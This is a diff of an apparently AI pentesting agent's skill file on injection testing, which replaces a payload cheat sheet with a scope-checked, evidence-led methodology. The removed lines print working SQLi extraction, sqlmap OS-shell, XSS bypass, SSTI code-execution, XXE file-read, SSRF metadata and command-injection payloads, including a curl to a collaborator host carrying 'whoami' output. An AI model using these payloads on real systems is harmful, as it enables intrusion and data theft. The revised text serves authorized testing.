@@ -1,397 +1,71 @@
 ---
 name: wstg-injection
-description: WSTG input validation and injection testing - SQLi, XSS, SSTI, SSRF, command injection, XXE
-tags: [injection, sqli, xss, ssti, ssrf, xxe, rce, wstg]
-version: "1.0"
+description: Evidence-led input validation and injection testing for authorized web applications
+tags: [injection, sqli, xss, ssti, xxe, command-injection, ldap, wstg]
+version: "1.1"
 ---
 
-# Input Validation & Injection Testing (WSTG-INPV)
-
-## SQL Injection
-
-### Detection Payloads (test in every input)
-
-```sql
-'
-''
-' OR '1'='1
-' OR '1'='1' --
-' OR '1'='1' #
-" OR "1"="1" --
-' AND 1=1 --
-' AND 1=2 --
-1' ORDER BY 1 --
-1' ORDER BY 100 --
-' UNION SELECT NULL --
-```
-
-### DB Fingerprinting (from error messages)
-
-| Error Snippet                                     | Database   |
-| ------------------------------------------------- | ---------- |
-| `You have an error in your SQL syntax`            | MySQL      |
-| `pg_query()`, `PSQLException`                     | PostgreSQL |
-| `Microsoft SQL Server`, `Unclosed quotation mark` | MSSQL      |
-| `ORA-`, `Oracle error`                            | Oracle     |
-| `SQLite`                                          | SQLite     |
-
-### Union-Based Extraction
-
-```sql
--- Step 1: Find column count
-' ORDER BY 1 -- ... ' ORDER BY N --
-' UNION SELECT NULL,NULL,... --
-
--- Step 2: Find displayable column
-' UNION SELECT 'a',NULL,NULL --
-
--- Step 3: Extract data
--- MySQL:
-' UNION SELECT table_name,NULL FROM information_schema.tables --
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
-' UNION SELECT username,password FROM users --
-
--- MSSQL:
-' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U' --
-
--- PostgreSQL:
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' --
-```
-
-### Blind SQLi
-
-```sql
--- Boolean-based
-' AND 1=1 --  (true response)
-' AND 1=2 --  (false response)
-' AND SUBSTRING(username,1,1)='a' --
-' AND (SELECT COUNT(*) FROM users)>0 --
-
--- Time-based
-' AND SLEEP(5) --                        (MySQL)
-'; WAITFOR DELAY '0:0:5' --              (MSSQL)
-' AND pg_sleep(5) --                     (PostgreSQL)
-' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- (Oracle)
-```
-
-### sqlmap Quick Reference
-
-```bash
-# Basic scan
-sqlmap -u "https://TARGET/page?id=1" --batch --random-agent
-
-# POST request
-sqlmap -u "https://TARGET/login" --data="user=admin&pass=test" -p user --batch
-
-# With authentication
-sqlmap -u "https://TARGET/page?id=1" --cookie="session=abc123" --batch
-
-# Enumerate
-sqlmap -u "URL" --dbs                    # List databases
-sqlmap -u "URL" -D dbname --tables       # List tables
-sqlmap -u "URL" -D db -T users --dump    # Dump table
-sqlmap -u "URL" --current-user           # Current DB user
-sqlmap -u "URL" --is-dba                 # Check DBA privs
-
-# Advanced
-sqlmap -u "URL" --os-shell               # OS shell
-sqlmap -u "URL" --file-read=/etc/passwd  # Read files
-sqlmap -u "URL" --tamper=space2comment,between  # WAF bypass
-sqlmap -u "URL" --level=5 --risk=3       # Thorough scan
-```
-
-## Cross-Site Scripting (XSS)
-
-### Reflected XSS Payloads
-
-```html
-<script>
-  alert(1)
-</script>
-<img src="x" onerror="alert(1)" />
-<svg onload="alert(1)">
-  <body onload="alert(1)">
-    <input onfocus="alert(1)" autofocus>
-      <details open ontoggle="alert(1)">
-        <marquee onstart="alert(1)">javascript:alert(1)</marquee>
-      </details>
-    </input>
-  </body>
-</svg>
-```
-
-### Context-Specific Payloads
-
-```html
-<!-- Inside HTML attribute (break out) -->
-" onmouseover="alert(1)
-' onfocus='alert(1)' autofocus='
-
-<!-- Inside script tag -->
-';alert(1);//
-</script><script>alert(1)</script>
-
-<!-- Inside JavaScript string -->
-\';alert(1);//
-\"-alert(1)-\"
-
-<!-- Inside URL/href -->
-javascript:alert(1)
-data:text/html,<script>alert(1)</script>
-
-<!-- Inside CSS -->
-expression(alert(1))
-url('javascript:alert(1)')
-```
-
-### Filter Bypass Techniques
-
-```html
-<!-- Case variation -->
-<ScRiPt>alert(1)</ScRiPt>
-<IMG SRC=x OnErRoR=alert(1)>
-
-<!-- Encoding -->
-<script>alert&#40;1&#41;</script>
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
-%3Cscript%3Ealert(1)%3C/script%3E
-
-<!-- No parentheses -->
-<img src=x onerror=alert`1`>
-<script>onerror=alert;throw 1</script>
-
-<!-- No quotes/angle brackets -->
-<svg/onload=alert(1)>
-<img src=x onerror=alert(1)//>
-
-<!-- Double encoding -->
-%253Cscript%253Ealert(1)%253C/script%253E
-```
-
-### Stored XSS Targets
-
-Test payload injection in: profile name/bio, comments, messages, forum posts, file names, email subjects, metadata fields, custom headers.
-
-## Command Injection
-
-### OS-Specific Payloads
-
-```bash
-# Linux
-; id
-| id
-|| id
-$(id)
-`id`
-; cat /etc/passwd
-| whoami
-& ping -c 1 COLLAB_SERVER &
-
-# Windows
-& ipconfig
-| net user
-; dir C:\
-& ping -n 1 COLLAB_SERVER &
-
-# Blind detection (use collaborator/webhook)
-; curl http://COLLAB_SERVER/$(whoami)
-| nslookup COLLAB_SERVER
-; ping -c 1 COLLAB_SERVER
-```
-
-### Bypasses
-
-```bash
-# Space bypass
-;{id}
-;$IFS'id'
-cat$IFS/etc/passwd
-cat${IFS}/etc/passwd
-X=$'cat\x20/etc/passwd'&&$X
-
-# Blacklist bypass
-/bin/c?t /etc/p?sswd
-c''a''t /etc/passwd
-c\at /etc/passwd
-```
-
-## Server-Side Template Injection (SSTI)
-
-### Detection Polyglot
-
-```
-${{<%[%'"}}%\.
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-#{7*7}
-*{7*7}
-```
-
-### Engine-Specific Payloads
-
-| Engine            | Detection         | RCE Payload                                                                                            |
-| ----------------- | ----------------- | ------------------------------------------------------------------------------------------------------ | ------ | --------------- |
-| Jinja2 (Python)   | `{{7*7}}` → 49    | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`                                   |
-| Twig (PHP)        | `{{7*7}}` → 49    | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`                 |
-| Freemarker (Java) | `${7*7}` → 49     | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`                                  |
-| Pebble (Java)     | `{{7*7}}` → 49    | `{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}` |
-| ERB (Ruby)        | `<%= 7*7 %>` → 49 | `<%= system("id") %>`                                                                                  |
-| Smarty (PHP)      | `{7*7}` → 49      | `{system('id')}`                                                                                       |
-| Handlebars (JS)   | `{{this}}`        | `{{#with "s" as                                                                                        | string | }}...{{/with}}` |
-
-## Server-Side Request Forgery (SSRF)
-
-### Internal Target URLs
-
-```
-http://127.0.0.1
-http://localhost
-http://0.0.0.0
-http://[::1]
-http://0x7f000001
-http://2130706433  (decimal)
-http://017700000001  (octal)
-http://127.1
-```
-
-### Cloud Metadata Endpoints
-
-```
-# AWS
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/user-data/
-
-# GCP
-http://metadata.google.internal/computeMetadata/v1/
-(Header: Metadata-Flavor: Google)
-
-# Azure
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-(Header: Metadata: true)
-
-# DigitalOcean
-http://169.254.169.254/metadata/v1/
-```
-
-### SSRF Bypass Techniques
-
-```
-# URL encoding
-http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
-
-# DNS rebinding
-Register DNS: evil.com → 169.254.169.254
-
-# Redirect bypass
-http://evil.com/redirect?url=http://169.254.169.254
-
-# Protocol smuggling
-gopher://127.0.0.1:6379/_SET%20key%20value
-dict://127.0.0.1:6379/SET:key:value
-```
-
-## XML External Entity (XXE)
-
-### Basic XXE
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root><data>&xxe;</data></root>
-```
-
-### Blind XXE (OOB via HTTP)
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://COLLAB_SERVER/xxe">
-  %xxe;
-]>
-```
-
-### XXE via File Upload
-
-Test in: SVG images, DOCX/XLSX/PPTX (unzip, inject in XML), SOAP requests, RSS feeds.
-
-```xml
-<!-- SVG XXE -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text x="0" y="16">&xxe;</text>
-</svg>
-```
-
-## LFI / Path Traversal
-
-```bash
-# Basic traversal
-../../../etc/passwd
-..%2f..%2f..%2fetc/passwd
-....//....//....//etc/passwd
-..%252f..%252f..%252fetc/passwd
-
-# Windows
-..\..\..\windows\win.ini
-..%5c..%5c..%5cwindows\win.ini
-
-# Null byte (older PHP)
-../../../etc/passwd%00
-../../../etc/passwd%00.jpg
-
-# Wrapper (PHP)
-php://filter/convert.base64-encode/resource=index.php
-php://input (POST body = PHP code)
-expect://id
-data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
-```
-
-## Host Header Injection
-
-```bash
-# Basic
-curl -H "Host: evil.com" https://TARGET/
-
-# X-Forwarded-Host
-curl -H "X-Forwarded-Host: evil.com" https://TARGET/
-
-# Password reset poisoning
-curl -X POST https://TARGET/forgot-password \
-  -H "Host: evil.com" \
-  -d "email=victim@target.com"
-# Check if reset link uses evil.com
-```
-
-## HTTP Parameter Pollution
-
-```bash
-# Duplicate parameters
-https://TARGET/page?id=1&id=2
-
-# Server behavior varies:
-# PHP/Apache: last value (id=2)
-# ASP.NET/IIS: both (id=1,2)
-# JSP/Tomcat: first value (id=1)
-```
-
-## Mass Assignment
-
-```bash
-# Add extra fields to updates
-curl -X PUT https://TARGET/api/profile \
-  -H "Content-Type: application/json" \
-  -H "Cookie: session=USER_SESSION" \
-  -d '{"name":"test","role":"admin","isAdmin":true,"verified":true}'
-
-# Common fields to try:
-# role, admin, isAdmin, is_admin, verified, active, permissions
-# price, discount, balance, credits
-# user_id, account_id, org_id
-```
-
-For detailed procedures on any test, read:
-`knowledge/web-application/WSTG-INPV/WSTG-INPV-{NN}.md`
+# Evidence-Led Input Validation and Injection Testing
+
+## Non-negotiable operating contract
+
+This is a methodology reference, not a requirement to test every input or every class.
+
+1. Confirm the canonical target workspace and persisted authorization scope before active requests. Call `scope_check` for the exact URL and canonical `target_url`. If scope is missing, ambiguous, invalid, or denied, stop active testing.
+2. Use the captured request and response, analyzer findings, source evidence, and prior observations to form one specific hypothesis. A parameter, free-text field, header, JSON body, or reflected value alone is not proof of an injection sink.
+3. Choose only the relevant class and input location. Use `inject_probe` only for those selected classes, then confirm a meaningful lead with `http_replay` and a baseline/negative control.
+4. Use harmless markers and test-owned fixtures. Never extract real records, dump schemas, read system files, execute commands, access cloud metadata/internal services, or trigger destructive or financial side effects to prove a finding.
+5. Distinguish an observed signal from an exploitable result. Reflection, a parser error, a status change, or timing variation alone is not confirmation; rule out benign explanations and establish the relevant security impact.
+6. Log every meaningful attempt with its actual observation, unique variation, strategy, and valid preconditions. Duplicate variations, planned-but-unrun tests, and tests with invalid scope/identity/setup do not count. A final false-positive/disproven verdict requires 20 distinct valid evidence-backed attempts plus the matching contradictory checks in `validate_finding`. If the bar cannot safely be met, keep the result `INCONCLUSIVE / NEEDS REVIEW`. A decisive confirmation may stop early.
+
+## Selecting a hypothesis
+
+Use the following signals to decide whether a class is relevant. These are indicators, not automatic proof.
+
+| Class | Evidence that may justify a targeted test | Safe confirmation principle |
+|---|---|---|
+| SQL / NoSQL injection | A plausible database/query sink, query-related source evidence, or a discriminating database/parser error | Compare a harmless true/false condition or controlled fixture result against a stable baseline; do not enumerate or extract data |
+| XSS | A value reaches a browser-rendered HTML/attribute/script/URL context | Use a unique inert marker first; establish context and encoding. Use a benign execution canary only where explicitly authorized and safe |
+| SSTI | Evidence of server-side template evaluation or a known rendering path | Use a non-destructive arithmetic expression such as `{{7*7}}` only where a template sink is plausible; compare with literal baseline |
+| Command injection | Evidence that the value reaches an OS command or process invocation | Prefer source/configuration review or a harmless fixed-output canary in a controlled test environment; never run system commands or exfiltrate output |
+| XXE | An XML parser processes attacker-controlled XML and external entities may be enabled | Use a controlled local test fixture or authorized canary. Never read local files or contact internal/metadata services |
+| LDAP / XPath | Evidence the backend builds LDAP filters or XPath expressions from the input | Use a safe boolean/control comparison specific to the identified parser; do not assume a JSON REST parameter reaches either parser |
+| Header / parameter pollution | Evidence that duplicate or alternate values are interpreted inconsistently across a trust boundary | Compare a captured baseline with a minimal, non-destructive variation and document which component consumed which value |
+
+## Workflow
+
+### 1. Establish the baseline
+
+- Read the exact captured request, response, response content type, redirects, cookies, and session/identity context.
+- Identify the input location and whether the value reaches the relevant parser or output context.
+- Record normal status, body shape, relevant headers, timing, and any state change.
+- Confirm scope and the approved replay tool before sending a mutation.
+
+### 2. Probe only the supported class
+
+- Call `inject_probe` with only the selected class(es) and exact input points when needed.
+- Treat tool output as leads, not findings. A reflection flag, error signature, or boolean difference can be caused by validation, WAF/CDN behavior, caching, or unrelated application logic.
+- Do not run a blanket sweep across all parameters. If the sink is not supported by evidence, stop and state what is missing.
+
+### 3. Confirm with a control
+
+- Replay the captured request through `http_replay`, changing one relevant factor at a time.
+- Preserve required session/CSRF semantics; use a unique benign marker and a negative control.
+- Verify that the effect is repeatable, tied to the candidate input, and not explained by cache, WAF, content negotiation, stale state, or tool artifacts.
+- Avoid aggressive timing tests, deep query expansion, blind high-volume probes, or repeated payload variations without a discriminating reason.
+
+### 4. Record the result honestly
+
+For each candidate, preserve:
+- Observed signal and exact request ID / evidence reference.
+- Hypothesis and why the chosen class is relevant.
+- Baseline, variation, negative control, and actual result.
+- Scope/identity/setup validity and any missing precondition.
+- Confirmed impact, benign explanation, or unresolved question.
+
+Use `validate_finding` for the required ten-check assessment. Do not infer a pass/fail from missing evidence. A missing security header, reflected input, error response, or blocked payload does not itself prove a vulnerability. A tool attempt is not a confirmed finding.
+
+## Stop conditions
+
+Stop active testing when scope or authorization is unclear, a safe control is unavailable, the test risks real user data or irreversible state, the relevant sink is not reached, or no meaningful safe hypothesis remains. Preserve the limitation as blocked/inconclusive rather than working around it.
+
